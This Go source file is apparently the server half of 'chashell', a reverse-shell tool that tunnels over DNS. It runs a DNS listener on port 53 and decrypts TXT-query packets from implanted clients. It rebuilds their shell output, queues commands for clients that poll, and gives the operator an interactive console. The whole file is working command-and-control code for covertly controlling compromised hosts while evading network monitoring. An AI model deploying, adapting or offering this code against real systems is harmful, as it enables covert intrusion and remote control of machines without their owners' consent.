package main

import (
	"bytes"
	"chashell/lib/crypto"
	"chashell/lib/protocol"
	"encoding/hex"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Store the current client GUID.
var currentSession string

// Those variables will be assigned during compile-time.
var (
	targetDomain  string
	encryptionKey string
)

// Store the data from clients received when not the active session.
var consoleBuffer = map[string]*bytes.Buffer{}

// Store the packets that will be sent when the client send a polling request.
var packetQueue = map[string][]string{}

// Store the sessions information.
var sessionsMap = map[string]*clientInfo{}

type clientInfo struct {
	hostname  string
	heartbeat int64
	mutex     sync.Mutex
	conn      map[int32]connData
}

type connData struct {
	chunkSize int32
	nonce     []byte
	packets   map[int32]string
}

func (ci *clientInfo) getChunk(chunkID int32) connData {
	// Return the chunk identifier.
	return ci.conn[chunkID]

}

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		// Make sure the request is a TXT question.
		case dns.TypeTXT:
			// Strip the target domain and every dots.
			dataPacket := strings.Replace(strings.Replace(q.Name, targetDomain, "", -1), ".", "", -1)

			// Hex-decode the packet.
			dataPacketRaw, err := hex.DecodeString(dataPacket)

			if err != nil {
				fmt.Printf("Unable to decode data packet : %s", dataPacket)
			}

			// Attempt to decrypt and authenticate the packet.
			output, valid := crypto.Open(dataPacketRaw[24:], dataPacketRaw[:24], encryptionKey)

			if !valid {
				fmt.Printf("Received invalid/corrupted packet. Dropping.\n")
				break
			}

			// Return the decoded protocol buffers packet.
			message := &protocol.Message{}
			if err := proto.Unmarshal(output, message); err != nil {
				log.Fatalln("Failed to parse message packet:", err)
			}

			// Generic answer.
			answer := "-"

			// Hex-encode the clientGUID to make it printable.
			clientGUID := hex.EncodeToString(message.Clientguid)

			if clientGUID == "" {
				fmt.Println("Invalid packet : empty clientGUID !")
				break
			}

			now := time.Now()

			// Check if the clientGUID exist in the session storage.
			session, valid := sessionsMap[clientGUID]

			// If this this a new client, create the associated session.
			if !valid {
				fmt.Printf("New session : %s\n", clientGUID)
				sessionsMap[clientGUID] = &clientInfo{heartbeat: now.Unix(), conn: make(map[int32]connData)}
				session = sessionsMap[clientGUID]
			}

			// Avoid race conditions.
			session.mutex.Lock()

			// Update the heartbeat of the session.
			session.heartbeat = now.Unix()

			// Identify the message type.
			switch u := message.Packet.(type) {
			case *protocol.Message_Pollquery:
				// Check if we have data to send.
				queue, valid := packetQueue[clientGUID]

				if valid && len(queue) > 0 {
					answer = queue[0]
					packetQueue[clientGUID] = queue[1:]
				}

			case *protocol.Message_Chunkstart:
				// We need to allocate a new session in order to store incoming data.
				session.conn[u.Chunkstart.Chunkid] = connData{chunkSize: u.Chunkstart.Chunksize, packets: make(map[int32]string)}

			case *protocol.Message_Chunkdata:
				// Get the storage associated to the chunkId.
				connection := session.getChunk(u.Chunkdata.Chunkid)

				// Store the data packet.
				connection.packets[u.Chunkdata.Chunknum] = string(u.Chunkdata.Packet)

				// Check if we have successfully received all the packets.
				if len(connection.packets) == int(connection.chunkSize) {
					// Rebuild the final data.
					var chunkBuffer bytes.Buffer
					for i := 0; i <= int(connection.chunkSize)-1; i++ {
						chunkBuffer.WriteString(connection.packets[int32(i)])
					}

					// If the current session is the clientGUID, print the data directly.
					if currentSession == clientGUID {
						fmt.Printf("%s", chunkBuffer.Bytes())
					} else {
						consoleBuffer[clientGUID].Write(chunkBuffer.Bytes())
					}
				}

			default:
				fmt.Printf("Unknown message type received : %v\n", u)
			}
			// Unlock the mutex.
			session.mutex.Unlock()

			rr, _ := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, answer))
			m.Answer = append(m.Answer, rr)

		}

	}
}

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {

	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func main() {

	go func() {
		// attach request handler func
		dns.HandleFunc(targetDomain, handleDNSRequest)

		// start server
		port := 53
		server := &dns.Server{Addr: ":" + strconv.Itoa(port), Net: "udp"}

		log.Printf("Starting DNS Listener %d\n", port)
		err := server.ListenAndServe()
		defer server.Shutdown()
		if err != nil {
			fmt.Printf("Failed to start server: %s\n ", err.Error())
			os.Exit(1)
		}
	}()

	go func() {
		for {
			time.Sleep(1 * time.Second)
			now := time.Now()
			for clientGUID, session := range sessionsMap {
				if session.heartbeat+30 < now.Unix() {
					fmt.Printf("Client timed out [%s].\n", clientGUID)
					// Delete from sessions list.
					delete(sessionsMap, clientGUID)
					// Delete all queued packets.
					delete(packetQueue, clientGUID)
				}
			}
		}
	}()

	p := prompt.New(executor, Completer, prompt.OptionPrefix("chashell >>> "))
	p.Run()
}
